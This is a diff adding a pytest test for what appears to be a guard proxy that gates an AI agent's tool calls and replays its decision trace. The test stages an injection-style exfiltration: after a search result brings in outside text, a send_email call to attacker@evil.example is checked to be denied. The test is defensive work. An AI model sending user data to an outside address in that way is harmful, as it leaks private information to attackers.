@@ -174,3 +174,44 @@ def test_answer_text_and_manifest_loading(tmp_path: Path) -> None:
     assert load_manifests(tmp_path / "d") == [{"id": "t"}]
     with pytest.raises(ValueError):
         Guard([], "n")
+
+
+async def test_the_shipped_trace_replays_to_the_verdict_given_live(
+        proxy: httpx.AsyncClient, link: FakeLink) -> None:
+    """What "Safe to ship?" and Replay's what-if stand on: the guard's trace,
+    re-gated under the same rules, reaches the verdict the guard gave live. A
+    trace without the kernel's provenance re-decided the refused exfiltration as
+    allowed — "1 attack now gets through" under the rules that had refused it."""
+    from axor_core.kernel.events import Event, EventKind, Verdict
+    from axor_core.kernel.replay import KernelConfig, replay
+
+    await proxy.get("/t/search/", params={"q": "how to reset"})
+    r = await proxy.post("/t/send_email/", json={"to": "attacker@evil.example", "body": "hi"})
+    assert r.status_code == 403
+    r = await proxy.post("/t/send_email/", json={"to": "boss@corp.example", "body": "weekly"})
+    assert r.status_code == 200
+
+    lines = [line for batch in link.shipped for line in batch]
+    assert "attacker" not in str(lines) and "boss@corp" not in str(lines)
+    # the answer that brought the outside text in is recorded as a source
+    sources = [ln for ln in lines if ln["kind"] == "tool_result" and ln["payload"].get("root")]
+    assert [ln["payload"]["tool"] for ln in sources] == ["search"]
+
+    events = [
+        Event(seq=i, node_id="support-agent", kind=EventKind(ln["kind"]),
+              ts=f"2026-01-01T00:00:{i:02d}+00:00", causal_root=ln.get("causal_root"),
+              gate=ln.get("gate"),
+              verdict=Verdict(ln["verdict"]) if ln.get("verdict") else None,
+              payload=ln["payload"])
+        for i, ln in enumerate(lines)
+    ]
+    config = KernelConfig(allowed_tools=frozenset({"search", "send_email"}),
+                          egress_sinks=frozenset({"send_email"}),
+                          driving_args={"send_email": frozenset({"to"})})
+    result = replay(events, config)
+    calls = [(st.event.payload["tool"], st.recorded_verdict, st.reevaluated_verdict)
+             for st in result.steps if st.event.kind is EventKind.TOOL_CALL]
+    assert calls == [("search", Verdict.PASS, Verdict.PASS),
+                     ("send_email", Verdict.DENY, Verdict.DENY),
+                     ("send_email", Verdict.PASS, Verdict.PASS)]
+    assert result.first_divergence is None
